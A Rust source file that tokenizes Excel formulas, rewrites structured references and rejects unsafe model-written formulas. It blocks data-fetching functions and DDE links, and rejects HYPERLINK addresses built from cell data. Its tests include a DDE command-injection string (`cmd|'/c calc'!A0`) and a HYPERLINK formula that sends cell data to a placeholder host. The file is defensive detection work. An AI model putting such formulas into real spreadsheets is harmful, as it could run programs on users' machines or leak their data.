//! Excel formulas as the Spreadsheet format reads them (§5.4, §8): a
//! tokenizer that never fails (unknown characters are tokens too), with byte
//! spans so references can be rewritten in place; structured references
//! (`Table[Column]`, `[@Column]`) in the short form the text writes and the
//! long form files store (`Table[[#This Row],[Column]]`); and the checks the
//! format makes on a formula a model writes — structured references only, no
//! function that fetches.

use std::fmt;

/// A formula token: its kind and its byte span in the formula.
#[derive(Clone, Debug, PartialEq)]
pub struct Token {
    pub kind: Tok,
    pub start: usize,
    pub end: usize,
}

#[derive(Clone, Debug, PartialEq)]
pub enum Tok {
    Space,
    /// `"text"`, `""` escaping a quote.
    Str,
    Num,
    Bool,
    /// `#N/A`, `#REF!`, …
    Error,
    /// A function name (the `(` follows).
    Func(String),
    /// An A1 reference, with its sheet prefix if written.
    Ref(Reference),
    /// A structured reference: `Table[…]`, `[@Column]`, `[Column]`.
    Structured(StructuredRef),
    /// A defined name (or anything else name-like).
    Name(String),
    /// A DDE link, `app|'topic'!item`.
    Dde,
    Op(String),
    Open,
    Close,
    /// `,` (argument separator or union).
    Comma,
    /// `{` / `}` of an array constant, `;` between its rows.
    Array(char),
    Unknown,
}

/// The sheet part of a reference: `Sheet1!`, `'My sheet'!`, `Sheet1:Sheet3!`, `[1]Sheet1!`.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SheetPrefix {
    /// Sheet name as meant (quotes removed, `''` unescaped); for a 3D reference the first sheet.
    pub name: String,
    /// The last sheet of a 3D reference.
    pub to: Option<String>,
    /// An external workbook reference (`[1]`).
    pub external: bool,
}

/// One end of an area: a cell, a whole column or a whole row, with `$` flags.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Corner {
    /// 0-based column; `None` in a row reference (`3:5`).
    pub col: Option<u32>,
    /// 1-based row; `None` in a column reference (`A:C`).
    pub row: Option<u32>,
    pub abs_col: bool,
    pub abs_row: bool,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Reference {
    pub sheet: Option<SheetPrefix>,
    /// `None` for `#REF!` after a sheet prefix.
    pub first: Option<Corner>,
    pub last: Option<Corner>,
}

/// A structured reference, parsed.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct StructuredRef {
    /// `None` when written without a table (`[@Column]` inside a table).
    pub table: Option<String>,
    /// Special items: `#All`, `#Data`, `#Headers`, `#Totals`, `#This Row` (`@`).
    pub items: Vec<String>,
    /// The first and last column named (the same column for one).
    pub columns: Option<(String, String)>,
}

impl StructuredRef {
    pub fn this_row(&self) -> bool {
        self.items.iter().any(|i| i.eq_ignore_ascii_case("#This Row"))
    }
}

/// Functions that fetch data from outside the workbook (§8).
pub const FETCH_FUNCTIONS: &[&str] = &[
    "WEBSERVICE",
    "FILTERXML",
    "IMPORTDATA",
    "IMPORTXML",
    "IMPORTHTML",
    "IMPORTFEED",
    "IMPORTRANGE",
    "RTD",
    "CALL",
    "REGISTER.ID",
    "REGISTER",
    "STOCKHISTORY",
    "IMAGE",
    "SQL.REQUEST",
];

const ERRORS: &[&str] = &[
    "#NULL!",
    "#DIV/0!",
    "#VALUE!",
    "#REF!",
    "#NAME?",
    "#NUM!",
    "#N/A",
    "#GETTING_DATA",
    "#SPILL!",
    "#CALC!",
    "#FIELD!",
];

fn is_name_char(c: char) -> bool {
    c.is_alphanumeric() || matches!(c, '_' | '.' | '\\' | '?')
}

/// Whether a sheet name must be quoted in a reference.
pub fn sheet_needs_quotes(name: &str) -> bool {
    name.is_empty()
        || !name.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '.')
        || name.chars().next().is_some_and(|c| c.is_ascii_digit())
        || looks_like_cell(name)
}

fn looks_like_cell(s: &str) -> bool {
    let k = s.find(|c: char| !c.is_ascii_alphabetic()).unwrap_or(s.len());
    k > 0 && k <= 3 && k < s.len() && s[k..].bytes().all(|b| b.is_ascii_digit())
}

/// `Sheet1!` or `'My sheet'!` for `name`.
pub fn sheet_prefix(name: &str) -> String {
    if sheet_needs_quotes(name) {
        format!("'{}'!", name.replace('\'', "''"))
    } else {
        format!("{name}!")
    }
}

/// Tokenize a formula (with or without its leading `=`, which is skipped).
pub fn tokenize(f: &str) -> Vec<Token> {
    let b = f.as_bytes();
    let mut out: Vec<Token> = vec![];
    let mut i = if f.starts_with('=') { 1 } else { 0 };
    while i < f.len() {
        let start = i;
        let c = f[i..].chars().next().unwrap();
        let push = |out: &mut Vec<Token>, kind: Tok, end: usize| out.push(Token { kind, start, end });
        if c.is_whitespace() {
            let end = f[i..].find(|c: char| !c.is_whitespace()).map_or(f.len(), |k| i + k);
            push(&mut out, Tok::Space, end);
            i = end;
            continue;
        }
        match c {
            '"' => {
                let mut j = i + 1;
                loop {
                    match f[j..].find('"') {
                        Some(k) if b.get(j + k + 1) == Some(&b'"') => j = j + k + 2,
                        Some(k) => {
                            j = j + k + 1;
                            break;
                        }
                        None => {
                            j = f.len();
                            break;
                        }
                    }
                }
                push(&mut out, Tok::Str, j);
                i = j;
            }
            '#' => {
                let e = ERRORS.iter().find(|e| f[i..].to_ascii_uppercase().starts_with(*e));
                let end = e.map_or(i + 1, |e| i + e.len());
                push(&mut out, if e.is_some() { Tok::Error } else { Tok::Unknown }, end);
                i = end;
            }
            '(' => {
                push(&mut out, Tok::Open, i + 1);
                i += 1;
            }
            ')' => {
                push(&mut out, Tok::Close, i + 1);
                i += 1;
            }
            ',' => {
                push(&mut out, Tok::Comma, i + 1);
                i += 1;
            }
            '{' | '}' | ';' => {
                push(&mut out, Tok::Array(c), i + 1);
                i += 1;
            }
            '[' => {
                // A structured reference without a table, or an external workbook prefix `[1]Sheet!A1`.
                let end = bracket_end(f, i);
                if let Some((reference, e)) = external_ref(f, i, end) {
                    push(&mut out, Tok::Ref(reference), e);
                    i = e;
                } else {
                    push(&mut out, Tok::Structured(parse_structured(None, &f[i..end])), end);
                    i = end;
                }
            }
            '\'' => {
                // A quoted sheet name, then `!` and a reference.
                match quoted_sheet(f, i).and_then(|(p, after)| reference_after(f, after, Some(p))) {
                    Some((r, e)) => {
                        push(&mut out, Tok::Ref(r), e);
                        i = e;
                    }
                    None => {
                        push(&mut out, Tok::Unknown, i + 1);
                        i += 1;
                    }
                }
            }
            '<' | '>' => {
                let tail = &f[i..];
                let n = if tail.starts_with("<=") || tail.starts_with(">=") || tail.starts_with("<>") { 2 } else { 1 };
                push(&mut out, Tok::Op(f[i..i + n].to_string()), i + n);
                i += n;
            }
            '+' | '-' | '*' | '/' | '^' | '&' | '=' | '%' | ':' | '@' | '!' => {
                push(&mut out, Tok::Op(c.to_string()), i + 1);
                i += 1;
            }
            '$' => match reference_after(f, i, None) {
                Some((r, e)) => {
                    push(&mut out, Tok::Ref(r), e);
                    i = e;
                }
                None => {
                    push(&mut out, Tok::Unknown, i + 1);
                    i += 1;
                }
            },
            c if c.is_ascii_digit() || c == '.' => {
                // A row range (`3:5`) or a number.
                if let Some((r, e)) = reference_after(f, i, None) {
                    push(&mut out, Tok::Ref(r), e);
                    i = e;
                    continue;
                }
                let end = number_end(f, i);
                push(&mut out, Tok::Num, end);
                i = end;
            }
            c if is_name_char(c) => {
                let end = f[i..].find(|c: char| !is_name_char(c)).map_or(f.len(), |k| i + k);
                let word = &f[i..end];
                let next = f[end..].chars().next();
                // `Sheet1!A1`, `Sheet1:Sheet3!A1`
                if let Some(e) = sheet_word_end(f, i) {
                    if let Some((r, e2)) = reference_after(f, e + 1, Some(plain_sheet(&f[i..e]))) {
                        push(&mut out, Tok::Ref(r), e2);
                        i = e2;
                        continue;
                    }
                }
                if next == Some('|') {
                    // DDE: app|'topic'!item or app|topic!item
                    let mut j = end + 1;
                    if f[j..].starts_with('\'') {
                        j = quoted_sheet(f, j).map_or(f.len(), |(_, a)| a - 1);
                    }
                    let e =
                        f[j..].find(|c: char| c.is_whitespace() || matches!(c, ',' | ')')).map_or(f.len(), |k| j + k);
                    push(&mut out, Tok::Dde, e);
                    i = e;
                    continue;
                }
                if next == Some('[') {
                    let e = bracket_end(f, end);
                    push(&mut out, Tok::Structured(parse_structured(Some(word.to_string()), &f[end..e])), e);
                    i = e;
                    continue;
                }
                if next == Some('(') {
                    push(&mut out, Tok::Func(word.to_string()), end);
                    i = end;
                    continue;
                }
                if let Some((r, e)) = reference_after(f, i, None) {
                    push(&mut out, Tok::Ref(r), e);
                    i = e;
                    continue;
                }
                let upper = word.to_ascii_uppercase();
                let kind = if upper == "TRUE" || upper == "FALSE" { Tok::Bool } else { Tok::Name(word.to_string()) };
                push(&mut out, kind, end);
                i = end;
            }
            _ => {
                let end = i + c.len_utf8();
                push(&mut out, Tok::Unknown, end);
                i = end;
            }
        }
    }
    out
}

fn number_end(f: &str, i: usize) -> usize {
    let b = f.as_bytes();
    let mut j = i;
    while j < b.len() && (b[j].is_ascii_digit() || b[j] == b'.') {
        j += 1;
    }
    if j < b.len() && (b[j] == b'e' || b[j] == b'E') {
        let mut k = j + 1;
        if k < b.len() && (b[k] == b'+' || b[k] == b'-') {
            k += 1;
        }
        if k < b.len() && b[k].is_ascii_digit() {
            while k < b.len() && b[k].is_ascii_digit() {
                k += 1;
            }
            j = k;
        }
    }
    j
}

/// The index after the `]` matching the `[` at `i` (`'` escapes the next character).
fn bracket_end(f: &str, i: usize) -> usize {
    let b = f.as_bytes();
    let mut depth = 0;
    let mut j = i;
    while j < b.len() {
        match b[j] {
            b'\'' => j += 1,
            b'[' => depth += 1,
            b']' => {
                depth -= 1;
                if depth == 0 {
                    return j + 1;
                }
            }
            _ => {}
        }
        j += 1;
    }
    f.len()
}

/// `[1]Sheet1!A1` or `[Book.xlsx]Sheet1!A1`.
fn external_ref(f: &str, i: usize, end: usize) -> Option<(Reference, usize)> {
    let inner = &f[i + 1..end - 1];
    if inner.contains('[') || inner.starts_with('@') || inner.starts_with('#') {
        return None;
    }
    let e = sheet_word_end(f, end)?;
    let mut p = plain_sheet(&f[end..e]);
    p.external = true;
    reference_after(f, e + 1, Some(p))
}

/// `'…'` at `i` followed by `!`: the prefix and the index after `!`.
fn quoted_sheet(f: &str, i: usize) -> Option<(SheetPrefix, usize)> {
    let b = f.as_bytes();
    let mut j = i + 1;
    let mut name = String::new();
    loop {
        let k = f[j..].find('\'')? + j;
        name.push_str(&f[j..k]);
        if b.get(k + 1) == Some(&b'\'') {
            name.push('\'');
            j = k + 2;
            continue;
        }
        j = k + 1;
        break;
    }
    if b.get(j) != Some(&b'!') {
        return None;
    }
    let mut p = plain_sheet(&name);
    if let Some(rest) = name.strip_prefix('[') {
        if let Some(k) = rest.find(']') {
            p = plain_sheet(&rest[k + 1..]);
            p.external = true;
        }
    }
    Some((p, j + 1))
}

/// The end of an unquoted sheet word at `i` when `!` follows it.
fn sheet_word_end(f: &str, i: usize) -> Option<usize> {
    let e = f[i..].find(|c: char| !(is_name_char(c) || c == ':')).map_or(f.len(), |k| i + k);
    (e > i && f[e..].starts_with('!')).then_some(e)
}

fn plain_sheet(s: &str) -> SheetPrefix {
    match s.split_once(':') {
        Some((a, b)) => SheetPrefix { name: a.to_string(), to: Some(b.to_string()), external: false },
        None => SheetPrefix { name: s.to_string(), to: None, external: false },
    }
}

/// A corner at `i`: `$A$1`, `A1`, `A` (column only), `1` (row only).
fn corner(f: &str, i: usize) -> Option<(Corner, usize)> {
    let b = f.as_bytes();
    let mut j = i;
    let abs_col = b.get(j) == Some(&b'$');
    if abs_col {
        j += 1;
    }
    let ls = j;
    while j < b.len() && b[j].is_ascii_alphabetic() && j - ls < 3 {
        j += 1;
    }
    let letters = &f[ls..j];
    let col = if letters.is_empty() { None } else { Some(col_of(letters)?) };
    let mut abs_row = false;
    let mut k = j;
    if b.get(k) == Some(&b'$') {
        abs_row = true;
        k += 1;
    }
    let ds = k;
    while k < b.len() && b[k].is_ascii_digit() {
        k += 1;
    }
    let row = if k > ds { Some(f[ds..k].parse::<u32>().ok().filter(|r| *r >= 1 && *r <= 1_048_576)?) } else { None };
    if row.is_none() && abs_row {
        return None;
    }
    if col.is_none() && (abs_col && letters.is_empty() && row.is_none()) {
        return None;
    }
    let c = Corner { col, row, abs_col: abs_col && col.is_some(), abs_row };
    if col.is_none() && row.is_none() {
        return None;
    }
    // `$3` is a row with an absolute marker on the row.
    let c = if col.is_none() { Corner { abs_row: abs_col || abs_row, abs_col: false, ..c } } else { c };
    Some((c, k))
}

fn col_of(letters: &str) -> Option<u32> {
    let mut n: u32 = 0;
    for b in letters.bytes() {
        n = n * 26 + (b.to_ascii_uppercase() - b'A' + 1) as u32;
    }
    (1..=16_384).contains(&n).then(|| n - 1)
}

/// A reference starting at `i` (after any sheet prefix): a cell, an area,
/// columns or rows; `#REF!` after a prefix. The next character must not
/// continue a name.
fn reference_after(f: &str, i: usize, sheet: Option<SheetPrefix>) -> Option<(Reference, usize)> {
    if sheet.is_some() && f[i..].starts_with("#REF!") {
        return Some((Reference { sheet, first: None, last: None }, i + 5));
    }
    let (a, j) = corner(f, i)?;
    let ends_ok = |k: usize| !f[k..].starts_with(|c: char| is_name_char(c) || c == '(' || c == '[' || c == '!');
    if f[j..].starts_with(':') {
        if let Some((b, k)) = corner(f, j + 1) {
            let same_kind = (a.col.is_some() == b.col.is_some()) && (a.row.is_some() == b.row.is_some());
            if same_kind && ends_ok(k) {
                return Some((Reference { sheet, first: Some(a), last: Some(b) }, k));
            }
        }
    }
    // A single corner must be a whole cell.
    if a.col.is_none() || a.row.is_none() || !ends_ok(j) {
        return None;
    }
    Some((Reference { sheet, first: Some(a), last: None }, j))
}

/// Parse `[…]` (with its brackets) of a structured reference.
fn parse_structured(table: Option<String>, s: &str) -> StructuredRef {
    let mut r = StructuredRef { table, ..Default::default() };
    let inner = s.strip_prefix('[').and_then(|x| x.strip_suffix(']')).unwrap_or(s);
    let mut cols: Vec<String> = vec![];
    let push_item = |item: &str, r: &mut StructuredRef, cols: &mut Vec<String>| {
        let t = item.trim();
        if t.starts_with('#') {
            r.items.push(normal_item(t));
        } else if !t.is_empty() {
            cols.push(unescape_col(t));
        }
    };
    if let Some(rest) = inner.strip_prefix('@') {
        r.items.push("#This Row".into());
        let rest = rest.trim();
        if !rest.is_empty() {
            for part in split_top(rest) {
                push_item(strip_brackets(part), &mut r, &mut cols);
            }
        }
    } else if inner.starts_with('[') {
        for part in split_top(inner) {
            push_item(strip_brackets(part), &mut r, &mut cols);
        }
    } else {
        push_item(inner, &mut r, &mut cols);
    }
    if let Some(first) = cols.first() {
        r.columns = Some((first.clone(), cols.last().unwrap().clone()));
    }
    r
}

fn normal_item(t: &str) -> String {
    let l = t.to_ascii_lowercase();
    match l.as_str() {
        "#all" => "#All",
        "#data" => "#Data",
        "#headers" => "#Headers",
        "#totals" => "#Totals",
        "#this row" => "#This Row",
        _ => t,
    }
    .to_string()
}

fn strip_brackets(s: &str) -> &str {
    let s = s.trim();
    s.strip_prefix('[').and_then(|x| x.strip_suffix(']')).unwrap_or(s)
}

/// Split `[a],[b]:[c]` at top-level `,` and `:`.
fn split_top(s: &str) -> Vec<&str> {
    let b = s.as_bytes();
    let mut out = vec![];
    let (mut depth, mut from, mut j) = (0, 0, 0);
    while j < b.len() {
        match b[j] {
            b'\'' => j += 1,
            b'[' => depth += 1,
            b']' => depth -= 1,
            b',' | b':' if depth == 0 => {
                out.push(&s[from..j]);
                from = j + 1;
            }
            _ => {}
        }
        j += 1;
    }
    out.push(&s[from..]);
    out
}

fn unescape_col(s: &str) -> String {
    let mut out = String::new();
    let mut it = s.chars();
    while let Some(c) = it.next() {
        if c == '\'' {
            if let Some(n) = it.next() {
                out.push(n);
            }
        } else {
            out.push(c);
        }
    }
    out
}

/// A column name as a structured reference writes it: `'` before `[`, `]`, `#` and `'`.
pub fn escape_col(s: &str) -> String {
    let mut out = String::new();
    for c in s.chars() {
        if matches!(c, '[' | ']' | '#' | '\'') {
            out.push('\'');
        }
        out.push(c);
    }
    out
}

/// Whether a column name needs its own brackets inside a reference (`[@[Col name]]`).
fn needs_brackets(s: &str) -> bool {
    s.chars().any(|c| c.is_whitespace() || "[]#',:@\"{}$^&*+=-<>/!%()~`;?\\|".contains(c))
}

impl fmt::Display for Corner {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        if let Some(c) = self.col {
            if self.abs_col {
                f.write_str("$")?;
            }
            f.write_str(&letters(c))?;
        }
        if let Some(r) = self.row {
            if self.abs_row {
                f.write_str("$")?;
            }
            write!(f, "{r}")?;
        }
        Ok(())
    }
}

fn letters(col: u32) -> String {
    let mut s = Vec::new();
    let mut n = col + 1;
    while n > 0 {
        s.push(b'A' + ((n - 1) % 26) as u8);
        n = (n - 1) / 26;
    }
    s.reverse();
    String::from_utf8(s).unwrap()
}

impl Reference {
    /// The reference written back, its sheet prefix as `prefix_text` (as it was written).
    pub fn write(&self, prefix_text: &str) -> String {
        let mut s = prefix_text.to_string();
        match (&self.first, &self.last) {
            (None, _) => s.push_str("#REF!"),
            (Some(a), None) => s.push_str(&a.to_string()),
            (Some(a), Some(b)) => s.push_str(&format!("{a}:{b}")),
        }
        s
    }
}

/// The sheet prefix text of a reference token (`'My sheet'!`), as written.
pub fn prefix_text<'a>(formula: &'a str, t: &Token) -> &'a str {
    let s = &formula[t.start..t.end];
    match s.rfind('!') {
        Some(k) if matches!(&t.kind, Tok::Ref(r) if r.sheet.is_some()) => &s[..=k],
        _ => "",
    }
}

/// Rewrite every reference token: `f` returns its replacement text, or `None` to keep it.
pub fn rewrite_refs(formula: &str, f: &mut dyn FnMut(&Token, &Reference) -> Option<String>) -> String {
    let mut out = String::with_capacity(formula.len());
    let mut at = 0;
    for t in tokenize(formula) {
        if let Tok::Ref(r) = &t.kind {
            if let Some(new) = f(&t, r) {
                out.push_str(&formula[at..t.start]);
                out.push_str(&new);
                at = t.end;
            }
        }
    }
    out.push_str(&formula[at..]);
    out
}

/// Rewrite structured references (their table and column names).
pub fn rewrite_structured(formula: &str, f: &mut dyn FnMut(&StructuredRef) -> Option<String>) -> String {
    let mut out = String::with_capacity(formula.len());
    let mut at = 0;
    for t in tokenize(formula) {
        if let Tok::Structured(r) = &t.kind {
            if let Some(new) = f(r) {
                out.push_str(&formula[at..t.start]);
                out.push_str(&new);
                at = t.end;
            }
        }
    }
    out.push_str(&formula[at..]);
    out
}

impl StructuredRef {
    /// The form a file stores: `T[[#This Row],[Col]]`, `T[Col]`, `T[[Col1]:[Col2]]`, `T[#All]`.
    pub fn file_form(&self, table: &str) -> String {
        let cols = self.columns.as_ref().map(|(a, b)| {
            if a == b {
                format!("[{}]", escape_col(a))
            } else {
                format!("[{}]:[{}]", escape_col(a), escape_col(b))
            }
        });
        let items: Vec<String> = self.items.iter().map(|i| format!("[{i}]")).collect();
        let inner = match (items.is_empty(), &cols) {
            (true, None) => String::new(),
            (true, Some(c)) if !c.contains("]:[") => c[1..c.len() - 1].to_string(),
            (true, Some(c)) => c.clone(),
            (false, None) if items.len() == 1 => items[0][1..items[0].len() - 1].to_string(),
            (false, None) => items.join(","),
            (false, Some(c)) => format!("{},{c}", items.join(",")),
        };
        format!("{table}[{inner}]")
    }

    /// The short form the text writes: `[@Col]`, `[@[Col name]]`, `T[Col]`, `T[@Col]` for another table.
    pub fn short_form(&self, own_table: &str) -> String {
        let t = self.table.as_deref().unwrap_or(own_table);
        let this = t.eq_ignore_ascii_case(own_table) || self.table.is_none();
        if self.this_row() && self.items.len() == 1 {
            let prefix = if this { "" } else { t };
            return match &self.columns {
                None => format!("{prefix}[@]"),
                Some((a, b)) if a == b => {
                    let c = escape_col(a);
                    if needs_brackets(a) {
                        format!("{prefix}[@[{c}]]")
                    } else {
                        format!("{prefix}[@{c}]")
                    }
                }
                Some((a, b)) => format!("{prefix}[@[{}]:[{}]]", escape_col(a), escape_col(b)),
            };
        }
        self.file_form(t)
    }
}

/// `=Table1[[#This Row],[매출]]-…` → `=[@매출]-…` for a formula column of `table`.
pub fn to_short_form(formula: &str, table: &str) -> String {
    rewrite_structured(formula, &mut |r| Some(r.short_form(table)))
}

/// `=[@매출]-…` → `=Table1[[#This Row],[매출]]-…`: the form a file stores.
pub fn to_file_form(formula: &str, table: &str) -> String {
    rewrite_structured(formula, &mut |r| {
        let t = r.table.clone().unwrap_or_else(|| table.to_string());
        Some(r.file_form(&t))
    })
}

/// Why a formula a model writes is refused (§5.4, §8), if it is.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum FormulaProblem {
    NotAFormula,
    /// An A1 reference (`D2`, `$D$2`, `D2:D9`, `매출!D2`).
    A1(String),
    /// A function that fetches data.
    Fetch(String),
    /// A DDE link.
    Dde(String),
    /// HYPERLINK with a URL built from cell data.
    DataUrl,
    /// Characters the tokenizer cannot read.
    Unreadable(String),
    Unbalanced,
}

impl fmt::Display for FormulaProblem {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            FormulaProblem::NotAFormula => f.write_str("a formula is text that starts with \"=\""),
            FormulaProblem::A1(r) => write!(
                f,
                "it uses the A1 reference {r}. Formulas use structured references only: [@Column] for this row, Table[Column] for a whole column"
            ),
            FormulaProblem::Fetch(n) => {
                write!(f, "it uses {n}, a function that fetches data; functions that fetch are not allowed")
            }
            FormulaProblem::Dde(t) => write!(f, "it holds a DDE link ({t}), which runs another program"),
            FormulaProblem::DataUrl => f.write_str(
                "HYPERLINK builds its address from cell data, which would send the data to that address; a HYPERLINK address is one plain text \"https://…\" with no query",
            ),
            FormulaProblem::Unreadable(s) => write!(f, "it cannot be read at {s:?}"),
            FormulaProblem::Unbalanced => f.write_str("its parentheses do not match"),
        }
    }
}

/// Function names in a formula, upper case, `_xlfn.`/`_xlws.` prefixes removed.
pub fn functions(tokens: &[Token]) -> Vec<String> {
    tokens
        .iter()
        .filter_map(|t| match &t.kind {
            Tok::Func(n) => Some(bare_function(n)),
            _ => None,
        })
        .collect()
}

pub fn bare_function(n: &str) -> String {
    let u = n.to_ascii_uppercase();
    let u = u.strip_prefix("_XLFN.").unwrap_or(&u);
    let u = u.strip_prefix("_XLWS.").unwrap_or(u);
    u.to_string()
}

/// §8 on any formula (a model's or a file's): fetching functions, DDE, and
/// HYPERLINK to an address built from data.
pub fn safety_problem(formula: &str) -> Option<FormulaProblem> {
    let toks = tokenize(formula);
    for (k, t) in toks.iter().enumerate() {
        match &t.kind {
            Tok::Dde => return Some(FormulaProblem::Dde(formula[t.start..t.end].to_string())),
            Tok::Func(n) => {
                let name = bare_function(n);
                if FETCH_FUNCTIONS.contains(&name.as_str()) {
                    return Some(FormulaProblem::Fetch(name));
                }
                if name == "HYPERLINK" && !plain_url_argument(formula, &toks[k + 1..]) {
                    return Some(FormulaProblem::DataUrl);
                }
            }
            _ => {}
        }
    }
    None
}

/// HYPERLINK's first argument is one string literal without a query.
fn plain_url_argument(formula: &str, rest: &[Token]) -> bool {
    let mut it = rest.iter().filter(|t| t.kind != Tok::Space);
    if it.next().map(|t| &t.kind) != Some(&Tok::Open) {
        return false;
    }
    let Some(arg) = it.next() else { return false };
    let end = it.next().map(|t| &t.kind);
    arg.kind == Tok::Str
        && matches!(end, Some(Tok::Comma) | Some(Tok::Close))
        && !formula[arg.start..arg.end].contains(['?', '&', '='])
}

/// Everything a model-written formula must pass (§5.4, §8).
pub fn model_formula_problem(formula: &str) -> Option<FormulaProblem> {
    let f = formula.trim();
    if !f.starts_with('=') || f.len() == 1 {
        return Some(FormulaProblem::NotAFormula);
    }
    if let Some(p) = safety_problem(f) {
        return Some(p);
    }
    let toks = tokenize(f);
    let mut depth: i32 = 0;
    for t in &toks {
        match &t.kind {
            Tok::Ref(_) => return Some(FormulaProblem::A1(f[t.start..t.end].to_string())),
            Tok::Unknown => return Some(FormulaProblem::Unreadable(f[t.start..].chars().take(12).collect())),
            Tok::Open => depth += 1,
            Tok::Close => {
                depth -= 1;
                if depth < 0 {
                    return Some(FormulaProblem::Unbalanced);
                }
            }
            _ => {}
        }
    }
    (depth != 0).then_some(FormulaProblem::Unbalanced)
}

/// The structured references of a formula.
pub fn structured_refs(formula: &str) -> Vec<StructuredRef> {
    tokenize(formula)
        .into_iter()
        .filter_map(|t| match t.kind {
            Tok::Structured(r) => Some(r),
            _ => None,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kinds(f: &str) -> Vec<String> {
        tokenize(f)
            .into_iter()
            .filter(|t| t.kind != Tok::Space)
            .map(|t| match t.kind {
                Tok::Ref(_) => format!("ref:{}", &f[t.start..t.end]),
                Tok::Structured(_) => format!("st:{}", &f[t.start..t.end]),
                Tok::Func(n) => format!("fn:{n}"),
                Tok::Name(n) => format!("name:{n}"),
                Tok::Dde => format!("dde:{}", &f[t.start..t.end]),
                k => format!("{k:?}"),
            })
            .collect()
    }

    #[test]
    fn tokens() {
        assert_eq!(kinds("=SUM(A1:B2)*2"), ["fn:SUM", "Open", "ref:A1:B2", "Close", "Op(\"*\")", "Num"]);
        assert_eq!(kinds("매출!D2+'My Sheet'!$A$1"), ["ref:매출!D2", "Op(\"+\")", "ref:'My Sheet'!$A$1"]);
        assert_eq!(kinds("SUM(A:A,3:5)"), ["fn:SUM", "Open", "ref:A:A", "Comma", "ref:3:5", "Close"]);
        assert_eq!(kinds("LOG10(x1y)"), ["fn:LOG10", "Open", "name:x1y", "Close"]);
        assert_eq!(kinds("Sales[매출]"), ["st:Sales[매출]"]);
        assert_eq!(kinds("[@[1인당 연봉]]*2"), ["st:[@[1인당 연봉]]", "Op(\"*\")", "Num"]);
        assert_eq!(kinds("\"a\"\"b\"&TRUE"), ["Str", "Op(\"&\")", "Bool"]);
        assert_eq!(kinds("cmd|'/c calc'!A0"), ["dde:cmd|'/c calc'!A0"]);
        assert_eq!(kinds("[1]Sheet1!A1"), ["ref:[1]Sheet1!A1"]);
        assert_eq!(kinds("Sheet1!#REF!"), ["ref:Sheet1!#REF!"]);
        assert_eq!(kinds("1.5E+3%"), ["Num", "Op(\"%\")"]);
        assert_eq!(kinds("_xlfn.XLOOKUP(1,A1:A3,B1:B3)")[0], "fn:_xlfn.XLOOKUP");
    }

    #[test]
    fn comparison_operators_before_unicode_references_preserve_token_boundaries() {
        for op in ["<", ">", "<=", ">=", "<>"] {
            for sheet in ["매출", "café", "销售"] {
                let formula = format!("IF(A1{op}{sheet}!$A$1,1,0)");
                let tokens = tokenize(&formula);
                assert!(tokens.iter().all(|t| formula.is_char_boundary(t.start) && formula.is_char_boundary(t.end)));
                assert!(tokens.iter().any(|t| t.kind == Tok::Op(op.into())));
                assert_eq!(
                    rewrite_refs(&formula, &mut |t, _| Some(formula[t.start..t.end].replace("A1", "A2"))),
                    format!("IF(A2{op}{sheet}!$A$1,1,0)")
                );
            }
        }
        assert_eq!(kinds("A1<"), ["ref:A1", "Op(\"<\")"]);
        assert_eq!(kinds("A1>"), ["ref:A1", "Op(\">\")"]);
    }

    #[test]
    fn structured_forms() {
        let t = "Sales";
        assert_eq!(to_file_form("=[@매출]-[@원가]", t), "=Sales[[#This Row],[매출]]-Sales[[#This Row],[원가]]");
        assert_eq!(to_short_form("=Sales[[#This Row],[매출]]-Sales[[#This Row],[원가]]", t), "=[@매출]-[@원가]");
        assert_eq!(to_file_form("=SUM([@[1분기]:[4분기]])", t), "=SUM(Sales[[#This Row],[1분기]:[4분기]])");
        assert_eq!(to_short_form("=SUM(Sales[[#This Row],[1분기]:[4분기]])", t), "=SUM([@[1분기]:[4분기]])");
        assert_eq!(to_file_form("=[@[1인당 연봉]]", t), "=Sales[[#This Row],[1인당 연봉]]");
        assert_eq!(to_short_form("=Sales[[#This Row],[1인당 연봉]]", t), "=[@[1인당 연봉]]");
        assert_eq!(
            to_file_form("=SUMIFS(Sales[매출],Sales[월],[@월])", "R"),
            "=SUMIFS(Sales[매출],Sales[월],R[[#This Row],[월]])"
        );
        assert_eq!(to_short_form("=SUM(Sales[#All])", t), "=SUM(Sales[#All])");
        let r = &structured_refs("=T[[#Headers],[#Data],[a'#b]]")[0];
        assert_eq!(r.items, ["#Headers", "#Data"]);
        assert_eq!(r.columns, Some(("a#b".into(), "a#b".into())));
    }

    #[test]
    fn model_formulas() {
        assert_eq!(model_formula_problem("=[@매출]-[@원가]"), None);
        assert_eq!(model_formula_problem("=SUM(Sales[매출])"), None);
        assert_eq!(model_formula_problem("=D2-E2"), Some(FormulaProblem::A1("D2".into())));
        assert_eq!(model_formula_problem("=SUM(매출!D2:D9)"), Some(FormulaProblem::A1("매출!D2:D9".into())));
        assert_eq!(model_formula_problem("[@a]"), Some(FormulaProblem::NotAFormula));
        assert_eq!(
            model_formula_problem("=WEBSERVICE(\"https://x\")"),
            Some(FormulaProblem::Fetch("WEBSERVICE".into()))
        );
        assert_eq!(model_formula_problem("=HYPERLINK(\"https://e.com/?q=\"&[@a])"), Some(FormulaProblem::DataUrl));
        assert_eq!(model_formula_problem("=HYPERLINK(\"https://e.com/a\",\"site\")"), None);
        assert_eq!(model_formula_problem("=SUM([@a]"), Some(FormulaProblem::Unbalanced));
        assert!(matches!(safety_problem("=cmd|'/c calc'!A0"), Some(FormulaProblem::Dde(_))));
    }
}
